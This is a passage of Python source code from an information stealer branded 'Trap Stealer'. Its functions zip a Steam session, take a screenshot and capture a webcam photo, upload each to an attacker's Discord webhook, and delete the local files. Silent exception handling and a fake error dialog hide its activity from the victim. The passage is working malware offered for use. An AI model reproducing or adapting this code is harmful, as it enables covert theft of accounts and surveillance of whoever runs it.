                    "color": 0xffb6c1,
                    "thumbnail": {
                        "url": "https://cdn.icon-icons.com/icons2/2107/PNG/512/filetype_ico_icon_130108.png"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

        file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
        data = {
            "username": "Trap Stealer",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
        }

        response = requests.post(webhook, files=file, data=data)
        try:

            os.remove(f"{os.environ['TEMP']}\steam_session.zip")

        except:
            pass


try:
    steam_st()
except:
    pass


def screen():

    img = ImageGrab.grab()
    img_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
    img.save(img_path)

    data = {
        "username": "Trap Stealer",
        "content": "",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
        "embeds": [
            {
                "title": "🍪 Trap Stealer Screen",
                "description": f"Screen taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
                "color": 0xffb6c1,
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "footer": {
                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                }
            }
        ]
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

    file = {"file": open(img_path, "rb")}

    data = {
        "username": "Trap Stealer",
        "content": "",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
    }

    response = requests.post(webhook, files=file, data=data)

    try:
        os.remove(img_path)
    except:
        pass



if shitty_message == True:
    print('Starting..')
else:
    pass
try:
    screen()
except:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "username": "Trap Stealer",
        "content": "",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
        "embeds": [
            {
                "title": "🍪 Trap Stealer Screen",
                "description": f"Cannot take any screen\n",
                "color": 0xffb6c1,
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "footer": {
                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                }
            }
        ]
    }
    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

def Camera_get():

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    try:
        subprocess.run(["fswebcam", "-q", "image.jpg"])


        file = {
            "file": ("image.jpg", open("image.jpg", "rb"))
        }

        data = {
            "username": "Trap Stealer",
            "content": "",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
        }

        response = requests.post(webhook, files=file, data=data)

        subprocess.run(["rm", "image.jpg"])

    except FileNotFoundError:
        data = {
            "username": "Trap Stealer",
            "content": "",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": "🍪 Trap Stealer Camera Stealer",
                    "description": f"Camera screen cannot be taken",
                    "color": 0xffb6c1,
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

try:
    Camera_get()
except:
    pass

if fakeerror == True:

    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)
else:
    pass
